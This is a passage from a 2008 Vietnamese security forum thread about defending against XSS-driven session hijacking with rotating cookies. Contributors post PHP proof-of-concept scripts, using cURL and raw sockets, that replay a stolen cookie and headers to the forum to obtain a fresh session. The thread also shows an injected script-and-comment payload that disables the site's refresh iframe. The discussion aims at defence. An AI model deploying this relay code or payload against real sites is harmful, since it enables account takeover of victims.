2) HVA trả lời request <b>thứ nhất</b> này đồng thời set một cookie "đặc biệt" trên trình duyệt của user A. Tạm gọi cookie này là <font color='orange'>cookie=1</font>

3) User A gởi request <b>thứ nhì</b> đến HVA, request này có kèm theo <font color='orange'>cookie=1</font>. Ở bước này HVA sẽ tiếp nhận request <b>thứ nhì</b> của user A nếu như nó có kèm theo <font color='orange'>cookie=1</font>. Nếu không, nó sẽ từ chối trả lời. Nếu HVA tiếp nhận request <b>thứ nhì</b> này (vì nó có kèm theo <font color='orange'>cookie=1</font>), HVA sẽ tiếp tục set một cookie khác đến trình duyệt của user A. Tạm gọi là <font color='green'>cookie=2</font> (cookie=1 đã bị hủy).

Cứ như thế, mỗi request từ user A phải kèm theo một cookie <b>mới nhất</b> và có giá trị được HVA set ở lần request <b>gần nhất trước đây</b> và request ấy chỉ được trả lời nếu như nó có cookie mới nhất và có giá trị.


Với cơ chế như trên, giả sử user B bằng cách nào đó "chôm" được cookie của user A (cứ cho rằng user B chôm được trọn bộ HTTP header của user A). Liệu user B có thể làm được gì với cookie lấy được? Tại sao? Tại sao không?

Mời bà con bàn.

Thân.&nbsp;
		</blockquote>
Theo em thằng Thằng User B nó vẫn exploit bình thường vì nó đã tóm được <font color='orange'>cookie thứ N</font> ( là mới nhất) sau đó nó <font color='orange'>nhanh tay </font>thực hiện một cú request khác đến HVA để lấy cái <font color='orange'>Cookie thứ N+1</font>. Tại sao phải nhanh tay, vì nếu không <font color='orange'>nhanh tay</font> thì thằng Victim A sau khi bị mất <font color='orange'>Cookie thứ N</font> nó duyệt một link khác trên HVA thì Cookie thứ N của thằng Hacker B trở nên vô giá trị :D. Đây cũng là một trong những phương pháp tốt để chống kiểu tấn công "<font color='orange'>Session fixation</font>"]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118197</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118197</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 13:17:48]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">gamma95 wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">conmale wrote:</cite><br>
		<blockquote>Khơi thêm một tí để bàn cho vui  :P 

Giả sử chúng ta có một trường hợp xử lý như sau:

1) User A gởi request <b>thứ nhất</b> đến HVA và chưa hề nhận được một cookie nào cả.

2) HVA trả lời request <b>thứ nhất</b> này đồng thời set một cookie "đặc biệt" trên trình duyệt của user A. Tạm gọi cookie này là <font color='orange'>cookie=1</font>

3) User A gởi request <b>thứ nhì</b> đến HVA, request này có kèm theo <font color='orange'>cookie=1</font>. Ở bước này HVA sẽ tiếp nhận request <b>thứ nhì</b> của user A nếu như nó có kèm theo <font color='orange'>cookie=1</font>. Nếu không, nó sẽ từ chối trả lời. Nếu HVA tiếp nhận request <b>thứ nhì</b> này (vì nó có kèm theo <font color='orange'>cookie=1</font>), HVA sẽ tiếp tục set một cookie khác đến trình duyệt của user A. Tạm gọi là <font color='green'>cookie=2</font> (cookie=1 đã bị hủy).

Cứ như thế, mỗi request từ user A phải kèm theo một cookie <b>mới nhất</b> và có giá trị được HVA set ở lần request <b>gần nhất trước đây</b> và request ấy chỉ được trả lời nếu như nó có cookie mới nhất và có giá trị.


Với cơ chế như trên, giả sử user B bằng cách nào đó "chôm" được cookie của user A (cứ cho rằng user B chôm được trọn bộ HTTP header của user A). Liệu user B có thể làm được gì với cookie lấy được? Tại sao? Tại sao không?

Mời bà con bàn.

Thân.&nbsp;
		</blockquote>
Theo em thằng Thằng User B nó vẫn exploit bình thường vì nó đã tóm được <font color='orange'>cookie thứ N</font> ( là mới nhất) sau đó nó <font color='orange'>nhanh tay </font>thực hiện một cú request khác đến HVA để lấy cái <font color='orange'>Cookie thứ N+1</font>. Tại sao phải nhanh tay, vì nếu không <font color='orange'>nhanh tay</font> thì thằng Victim A sau khi bị mất <font color='orange'>Cookie thứ N</font> nó duyệt một link khác trên HVA thì Cookie thứ N của thằng Hacker B trở nên vô giá trị :D. Đây cũng là một trong những phương pháp tốt để chống kiểu tấn công "<font color='orange'>Session fixation</font>"&nbsp;
		</blockquote>

nếu bên client thêm 1 đoạn javascript connect đến hva để nhận sessionID mới thì sao nhỉ ?, sau khoảng thời gian delay phù hợp nào đó ? ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118216</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118216</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 15:24:56]]> GMT</pubDate>
				<author><![CDATA[ secmask]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ @secmask: tui có nói đến cụm từ "nhanh tay" :D, còn chuyện một đoạn javascript để connect đến HVA trong khoảng thời gian delay nào đó ... thì attacker có thể disable đoạn script đó cũng bằng "XSS exploit ". Cụ thể là một đoạn javascript set lại thời gian delay phía victim ( hoặc Disable luôn) sau đó mới chôm cookie bình thường :D]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118219</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118219</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 15:45:26]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Cách của bác conmale có thể bypass 1 cách đơn giản thế này (không cần phải nhanh tay ha :D) : khi server của người tấn công nhận đc cookie mới nhất của victim, nó tự động liền sau đó gửi yêu cầu tới web server với http header và cookie của victim để lấy về cookie "mới hơn nữa" :D như vậy kẻ tấn công sẽ chiếm đc 1 cookie hợp lệ, đồng thời biến cookie đang lưu trong browser nạn nhân trở thành bất hợp lệ. Và thông thường boom_jt thấy thì nạn nhân có login lại thì cookie của kẻ tấn công cũng không trở thành bất hợp lệ do sự cho phép nhiều người dùng đăng nhập vào cùng 1 tài khoản.
Vậy làm sao để hạn chế việc này?

1. Chỉ cho phép 1 người dùng đăng nhập vào 1 tài khoản trong 1 thời điểm, và cookie đc set khi đăng nhập thành công sẽ là cookie hợp lệ. tất nhiên điều này kéo theo 1 vài ràng buộc nào đó liên quan đến yêu cầu phần mềm, nói chung là cũng còn tùy trường hợp. Trong trường hợp HVA forum thì có lẽ cơ chế này có thể áp dụng

2. Dựa trên cách bác conmale đề ra: sử dụng 1 cookie SID không đổi (session) và cookie động (giống như của bác conmale). Chỉ cần cookie động không hợp lệ là SID sẽ bị loại bỏ luôn. Như thế, khi nạn nhân sử dụng cookie "không còn hợp lệ" (do cách khai thác ở trên) để tạo kết nối tiếp theo cũng đồng nghĩa với việc biến cookie "hợp lệ" đang nằm trong tay kẻ tấn công thành bất hợp lệ. Nạn nhân sẽ phải đăng nhập lại để có cookie hợp lệ.

Tuy nhiên, với cách 2 như vừa nêu, giả sử lỗi XSS nằm ngay tại index của diễn đàn (hay trong danh sách thành viên online chẳng hạn), sẽ dẫn đến 1 vấn đề là toàn bộ thành viên sẽ ko thể vào đc diễn đàn, vì cookie của họ liên tục trở thành bất hợp lệ! 
Phương pháp nào cũng có mặt trái của nó :( kèm theo đó là 1 số bất cập do các bác đã nêu...

thân mến]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118231</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118231</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 16:34:32]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ @boom_it: đồng chí nói rõ cái công nghệ "tự động gởi tới webserver" đc ko? :D]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118235</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118235</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 16:46:06]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">gamma95 wrote:</cite><br>
		<blockquote>@secmask: tui có nói đến cụm từ "nhanh tay" :D, còn chuyện một đoạn javascript để connect đến HVA trong khoảng thời gian delay nào đó ... thì attacker có thể disable đoạn script đó cũng bằng "XSS exploit ". Cụ thể là một đoạn javascript set lại thời gian delay phía victim ( hoặc Disable luôn) sau đó mới chôm cookie bình thường :D&nbsp;
		</blockquote>
Hiện tại HVA có dùng 1 iframe ở cuối để ping về HVA sau interval 600s, có thể kết hợp cái này để làm mới cookie mà  không cần đoạn javascrip secmask nói.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118244</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118244</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 17:08:39]]> GMT</pubDate>
				<author><![CDATA[ vivashadow]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">gamma95 wrote:</cite><br>
		<blockquote>@boom_it: đồng chí nói rõ cái công nghệ "tự động gởi tới webserver" đc ko? :D&nbsp;
		</blockquote>

Nào có phải "công nghệ" gì đâu :) chẳng qua nó là feature của 1 số ngôn ngữ lập trình có hỗ trợ, chẳng hạn như php thì có hàm curl, asp.net thì có HttpConnection (hay j j ý quên rùi :P) ... Nó cho phép tạo kết nối HTTP, set các trường header, cookie ... Ko rõ gamma95 muốn hỏi j cụ thể hơn chăng? :-/]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118255</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118255</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 17:30:23]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>Cách của bác conmale có thể bypass 1 cách đơn giản thế này (không cần phải nhanh tay ha :D) : khi server của người tấn công nhận đc cookie mới nhất của victim, nó tự động liền sau đó gửi yêu cầu tới web server với http header và cookie của victim để lấy về cookie "mới hơn nữa" :D như vậy kẻ tấn công sẽ chiếm đc 1 cookie hợp lệ, đồng thời biến cookie đang lưu trong browser nạn nhân trở thành bất hợp lệ. Và thông thường boom_jt thấy thì nạn nhân có login lại thì cookie của kẻ tấn công cũng không trở thành bất hợp lệ do sự cho phép nhiều người dùng đăng nhập vào cùng 1 tài khoản.
&nbsp;
		</blockquote>
Nếu không nhanh tay thì làm sao có thể tiếp tục dùng cookie chôm được để gởi request đến HVA server để lấy cookie mới? Nếu kẻ tấn công cần thời gian để setup và để có thể dùng cookie chôm được, lúc ấy có thể cookie mới đã được cấp đến victim rồi và cookie chôm được trở thành vô dụng. Cái quan trọng là động tác <i>"tự động liền sau đó gửi yêu cầu tới web server với http header và cookie của victim để lấy về cookie"</i> thực hiện như thế nào.

Nên nhớ rằng, các phương pháp xss hiện giờ chưa có cách nào khả dĩ để có thể <i>"tự động gởi yêu cầu đến server bằng cookie chôm được"</i> với thời gian đủ nhanh. Chỉ có một khả năng có thể khai thác khá bảo đảm là sau khi bị chôm mất cookie, victim vẫn không làm gì tiếp để cập nhật cookie mới (đứng idle).
 
<p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>
Vậy làm sao để hạn chế việc này?

1. Chỉ cho phép 1 người dùng đăng nhập vào 1 tài khoản trong 1 thời điểm, và cookie đc set khi đăng nhập thành công sẽ là cookie hợp lệ. tất nhiên điều này kéo theo 1 vài ràng buộc nào đó liên quan đến yêu cầu phần mềm, nói chung là cũng còn tùy trường hợp. Trong trường hợp HVA forum thì có lẽ cơ chế này có thể áp dụng
&nbsp;
		</blockquote>
HVA forum chưa bao giờ cho phép 1 tài khoản có thể login ở 2 thời điểm khác nhau song song nhau. Chỉ có thể có một xuất đăng nhập tồn tại trong một thời điểm mà thôi.

<p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>
2. Dựa trên cách bác conmale đề ra: sử dụng 1 cookie SID không đổi (session) và cookie động (giống như của bác conmale). Chỉ cần cookie động không hợp lệ là SID sẽ bị loại bỏ luôn. Như thế, khi nạn nhân sử dụng cookie "không còn hợp lệ" (do cách khai thác ở trên) để tạo kết nối tiếp theo cũng đồng nghĩa với việc biến cookie "hợp lệ" đang nằm trong tay kẻ tấn công thành bất hợp lệ. Nạn nhân sẽ phải đăng nhập lại để có cookie hợp lệ.
&nbsp;
		</blockquote>
Logic là thế.

<p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>
Tuy nhiên, với cách 2 như vừa nêu, giả sử lỗi XSS nằm ngay tại index của diễn đàn (hay trong danh sách thành viên online chẳng hạn), sẽ dẫn đến 1 vấn đề là toàn bộ thành viên sẽ ko thể vào đc diễn đàn, vì cookie của họ liên tục trở thành bất hợp lệ! 
Phương pháp nào cũng có mặt trái của nó :( kèm theo đó là 1 số bất cập do các bác đã nêu...

thân mến&nbsp;
		</blockquote>
Nếu như session của kẻ tấn công có yếu tố nào đó giúp phân biệt được và chính session (của người thực hiện hijack) ấy bị hủy chớ không phải session của người bị hijack bị hủy thì sao? :).]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118257</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118257</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 17:42:50]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">vivashadow wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">gamma95 wrote:</cite><br>
		<blockquote>@secmask: tui có nói đến cụm từ "nhanh tay" :D, còn chuyện một đoạn javascript để connect đến HVA trong khoảng thời gian delay nào đó ... thì attacker có thể disable đoạn script đó cũng bằng "XSS exploit ". Cụ thể là một đoạn javascript set lại thời gian delay phía victim ( hoặc Disable luôn) sau đó mới chôm cookie bình thường :D&nbsp;
		</blockquote>
Hiện tại HVA có dùng 1 iframe ở cuối để ping về HVA sau interval 600s, có thể kết hợp cái này để làm mới cookie mà  không cần đoạn javascrip secmask nói.&nbsp;
		</blockquote>
@vivashadow:
Attacker dễ dàng inject cái script này để disable nguyên đoạn mã html phía dưới, trong đó có cả cái iframe chứa ping.jsp của HVA
<blockquote><font color='orange'>&lt;script&gt;window.open() .....&lt;/script&gt;</font><font color='yellow'>&lt;!--</font>&nbsp;
		</blockquote>

<blockquote>
   <blockquote> Cách của bác conmale có thể bypass 1 cách đơn giản thế này (không cần phải nhanh tay ha ) : khi server của người tấn công nhận đc cookie mới nhất của victim, nó tự động liền sau đó gửi yêu cầu tới web server với http header và cookie của victim để lấy về cookie "mới hơn nữa" như vậy kẻ tấn công sẽ chiếm đc 1 cookie hợp lệ, đồng thời biến cookie đang lưu trong browser nạn nhân trở thành bất hợp lệ. Và thông thường boom_jt thấy thì nạn nhân có login lại thì cookie của kẻ tấn công cũng không trở thành bất hợp lệ do sự cho phép nhiều người dùng đăng nhập vào cùng 1 tài khoản.&nbsp;
		</blockquote>
      


Nếu không nhanh tay thì làm sao có thể tiếp tục dùng cookie chôm được để gởi request đến HVA server để lấy cookie mới? Nếu kẻ tấn công cần thời gian để setup và để có thể dùng cookie chôm được, lúc ấy có thể cookie mới đã được cấp đến victim rồi và cookie chôm được trở thành vô dụng. Cái quan trọng là động tác "<font color='orange'>tự động liền sau đó gửi yêu cầu tới web server với http header và cookie của victim để lấy về cookie</font>"<font color='yellow'> thực hiện như thế nào</font>.&nbsp;
		</blockquote>
@boom_it: ý anh conmale cũng là ý tui muốn hỏi, nếu có thể bạn có thể viết một đoạn mã nhỏ (PoC) để demo thử.
]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118261</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118261</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 17:53:10]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ :) Phải nói rõ ràng thêm 1 chút thế này: khi boom_jt nói "không cần nhanh tay" là ý nhấn mạnh vào từ "tay" - muốn nói do đã có script tự động thực hiện hộ việc làm bằng tay của kẻ tấn công để chiếm đc cookie hợp lệ tiếp theo rồi, chứ ko có ý nhấn mạnh vào đoạn "không cần nhanh" :D

<p></p>
		<cite class="blockquote">conmale wrote:</cite><br>
		<blockquote> Nên nhớ rằng, các phương pháp xss hiện giờ chưa có cách nào khả dĩ để có thể "tự động gởi yêu cầu đến server bằng cookie chôm được" với thời gian đủ nhanh.&nbsp;
		</blockquote>

Việc "tự động gởi yêu cầu đến server bằng cookie chôm được" đc thực hiện trên server của kẻ tấn công, và nó hoàn toàn không liên quan đến khả năng của XSS hay ko ^_^
Có thể ví dụ 1 chút thế này:

Filename: conmale_gamma95.php :P
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>...
$user_agent = $_SERVER&#91;'HTTP_USER_AGENT'&#93;;
... // lưu các giá trị nhận đc vào các biến 

$ch = curl_init&#40;'http://www.hvaonline.net/hvaonline/recentTopics/list.html'&#41;;
curl_setopt&#40;$ch, CURLOPT_USERAGENT, $user_agent&#41;;
... // set đầy đủ các thuộc tính thu đc từ http header
curl_setopt&#40;$ch, CURLOPT_COOKIE, $cookie&#41;;
$res = curl_exec&#40;$ch&#41;; //thực hiện kết nối tới HVA bằng cookie vừa nhận đc
curl_close&#40;$ch&#41;;

SaveCookie&#40;$res&#41;  //thực hiện việc lưu cookie mới nhận đc trong kết quả trả về</pre>
		</div>

(xin thứ lỗi cho boom_jt vì đoạn code trên mang tính chất cực kì "PoC", vì boom_jt ko thật rành lập trình cho đúng syntax á :"&gt;)

Vậy đoạn mã khai thác XSS có thể khiến browser nạn nhân kết nối tới địa chỉ:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>http://host/conmale_gamma95.php</pre>
		</div>

Vậy khi đó, việc của conmale_gamma95.php là kết nối tới<span class="link"> http://www.hvaonline.net/hvaonline/recentTopics/list.html</span> để lấy cookie mới và lưu nó lại.

thân mến

p/s
<p></p>
		<cite class="blockquote">conmale wrote:</cite><br>
		<blockquote> Nếu như session của kẻ tấn công có yếu tố nào đó giúp phân biệt được và chính session (của người thực hiện hijack) ấy bị hủy chớ không phải session của người bị hijack bị hủy thì sao?&nbsp;
		</blockquote>

hiện tại boom_jt chưa nghĩ ra, mong bác conmale chỉ giáo :)]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118277</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118277</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 18:51:37]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>:
<p></p>
		<cite class="blockquote">conmale wrote:</cite><br>
		<blockquote> Nếu như session của kẻ tấn công có yếu tố nào đó giúp phân biệt được và chính session (của người thực hiện hijack) ấy bị hủy chớ không phải session của người bị hijack bị hủy thì sao?&nbsp;
		</blockquote>

hiện tại boom_jt chưa nghĩ ra, mong bác conmale chỉ giáo :)&nbsp;
		</blockquote>Cái chỗ này chính xác là vấn đề mọi người đáng quan tâm :) , Bạn nên nghĩ tới các yếu tố kết hợp nào để tạo ra một session như thế nhằm để phân biệt được ai là kẻ đang giả mạo phiên truy cập :D, Vd nhé : người dùng hợp lệ đang duyện HVA bằng IE, còn kẻ tấn công thì dùng firefox ... đó là những yếu tố cần kết hợp để tạo ra một sessioniD có thể phân biệt. Không biết đúng không ta ? :D]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118281</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118281</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 19:05:00]]> GMT</pubDate>
				<author><![CDATA[ ThíchHắcKinh]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[ @boom_it: đoạn mã cậu post lên tui chưa thấy tính tự động ở đâu cả. Cái tự động ở đây theo ý tui là ngay khi cái file log.txt nhận được cookie được gởi đến bởi nạn nhân thì ngay lập tức nó lấy giá trị cookie + HTTP header đó generate ra một http request đến server HVA ngay lập tức để lấy cookie mới kìa :)]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118282</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118282</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 19:07:35]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ hì hì, do bạn chưa đọc toàn bộ thread rồi, ý kiến bạn vừa nêu chính là liên quan tới http header đó :)]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118285</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118285</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 19:09:02]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">ThíchHắcKinh wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>:
<p></p>
		<cite class="blockquote">conmale wrote:</cite><br>
		<blockquote> Nếu như session của kẻ tấn công có yếu tố nào đó giúp phân biệt được và chính session (của người thực hiện hijack) ấy bị hủy chớ không phải session của người bị hijack bị hủy thì sao?&nbsp;
		</blockquote>

hiện tại boom_jt chưa nghĩ ra, mong bác conmale chỉ giáo :)&nbsp;
		</blockquote>Cái chỗ này chính xác là vấn đề mọi người đáng quan tâm :) , Bạn nên nghĩ tới các yếu tố kết hợp nào để tạo ra một session như thế nhằm để phân biệt được ai là kẻ đang giả mạo phiên truy cập :D, Vd nhé : <b><font color='red'>người dùng hợp lệ đang duyện HVA bằng IE, còn kẻ tấn công thì dùng firefox</font></b> ... đó là những yếu tố cần kết hợp để tạo ra một sessioniD có thể phân biệt. Không biết đúng không ta ? :D&nbsp;
		</blockquote>

Kẻ tấn công chôm trọn bộ HTTP headers của nạn nhân mà bồ :). Hắn sẽ dùng trọn bộ HTTP headers (có cả cookie trong đó) để impersonate và hijack session. Tuy vậy, hắn vẫn bị một số hạn chế và chúng ta đang thử nghĩ xem những hạn chế đó là gì để dùng nó giảm thiểu dung hại tình trạng bị hijack.

Thân.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118287</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118287</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 19:12:06]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">gamma95 wrote:</cite><br>
		<blockquote>@boom_it: đoạn mã cậu post lên tui chưa thấy tính tự động ở đâu cả. Cái tự động ở đây theo ý tui là ngay khi cái file log.txt nhận được cookie được gởi đến bởi nạn nhân thì ngay lập tức nó lấy giá trị cookie + HTTP header đó generate ra một http request đến server HVA ngay lập tức để lấy cookie mới kìa :)&nbsp;
		</blockquote>

Chị gammar95 ạ ...đoạn code trên của boom_it chỉ mang tính tham khảo, vấn đề gởi request tự động khi thu thập được header + session của nạn nhân dễ dàng thực hiện được nếu dùng socket trong PHP ... đoạn code sau cũng mang tính tham khảo :D

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>&lt;?php
function getURL&#40;&#41;{
	error_reporting&#40;E_ALL&#41;;
	$filenameurl = "urlip.txt"; //the default blog file
	$sReponse="heheheheh";
	//echo "&lt;h2&gt;TCP/IP Connection&lt;/h2&gt;\n";

	/* Get the port for the WWW service. */
	$service_port = getservbyname&#40;'www', 'tcp'&#41;;

	/* Get the IP address for the target host. */
	
	$address = gethostbyname&#40;'www.hvaonline.net/......'&#41;;  //gì gì đó :D

	/* Create a TCP/IP socket. */
	$socket = socket_create&#40;AF_INET, SOCK_STREAM, SOL_TCP&#41;;
	if &#40;$socket === false&#41; {
		//echo "socket_create&#40;&#41; failed: reason: " . socket_strerror&#40;socket_last_error&#40;&#41;&#41; . "\n";
	} else {
		//echo "OK.\n";
	}

	//echo "Attempting to connect to '$address' on port '$service_port'...";
	$result = socket_connect&#40;$socket, $address, $service_port&#41;;
	if &#40;$result === false&#41; {
		//echo "socket_connect&#40;&#41; failed.\nReason: &#40;$result&#41; " . socket_strerror&#40;socket_last_error&#40;$socket&#41;&#41; . "\n";
	} else {
		//echo "OK.\n";
	}

	$in = "GET /hvaonline/posts/reply/0/15621.html HTTP/1.1\r\n";  /// ... gì gì đó :D
	$in .= "Host:www.hvaonline.net\r\n";
       //chỗ này chèn thông tin thu thập gì gì đó
       //..
      //..

        $in .= "Connection: Close\r\n\r\n";
	$out = '';


	//echo "Sending HTTP HEAD request...";
	socket_write&#40;$socket, $in, strlen&#40;$in&#41;&#41;;
	//echo "OK.\n";

	//echo "Reading response:\n\n";
	while &#40;$out = socket_read&#40;$socket, 2048&#41;&#41; {
		//echo $out;
		$sReponse .=  $out;
	}

	//echo "Closing socket...";
	socket_close&#40;$socket&#41;;
	//echo "OK.\n\n";

	if &#40;file_exists&#40;"$filenameurl"&#41;&#41; {
			$fp = fopen&#40;$filenameurl,"a+"&#41;;
			fputs&#40;$fp,"==========\n".$sReponse."\n==========\n"&#41;;
			fclose&#40;$fp&#41;; 
	}
}</pre>
		</div>

@conmale : Nếu vậy thì phải suy nghĩ thêm chút nữa đã :D]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118290</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118290</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 19:20:15]]> GMT</pubDate>
				<author><![CDATA[ ThíchHắcKinh]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ @long3ta: chuyện này tui biết chứ  :D, và tất nhiên là làm được. Nhưng cái tui cần là các bác demo hoàn chỉnh kìa :D. Dùng phương pháp ghi $cookie, $http_header ra file log.txt rồi mới đọc vào  rồi generate ra http_request... blah blah là thua rồi nhé :)]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118293</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118293</link>
				<pubDate><![CDATA[Thu, 6 Mar 2008 19:25:54]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ hi, cái post liền trên của mình là trả lời ThíchHắcKinh đó nhá, giải thích kẻo mọi người hiểu lầm :D

<p></p>
		<cite class="blockquote">gamma95 wrote:</cite><br>
		<blockquote>@boom_it: đoạn mã cậu post lên tui chưa thấy tính tự động ở đâu cả. Cái tự động ở đây theo ý tui là ngay khi cái file log.txt nhận được cookie được gởi đến bởi nạn nhân thì ngay lập tức nó lấy giá trị cookie + HTTP header đó generate ra một http request đến server HVA ngay lập tức để lấy cookie mới kìa :)&nbsp;
		</blockquote>
Hoàn toàn tự động theo đúng yêu cầu của bạn đó mà :)

Hi vọng bạn hiểu rõ hơn thông qua cái mình vẽ dưới đây:

browser nạn nhân |-------------Cookie1------------------&gt; conmale_gamma95.php

conmale_gamma95.php|---------------Cookie1------------------&gt; HVA

conmale_gamma95.php &lt;---------------Cookie2------------------| HVA

browser nạn nhân  &lt;-------------response bất kì---------------| conmale_gamma95.php

Hình trên là toàn bộ quá trình từ lúc browser nạn nhân gửi thông tin tới server kẻ tấn công cho đến khi browser nhận đc kết quả trả lời của request đó.

Việc thực hiện tự động của file conmale_gamma95.php chính là do sự kích hoạt của request từ browser nạn nhân.

hic, nãy hiển thị có vấn đề phải vào chỉnh lại]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118294</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118294</link>
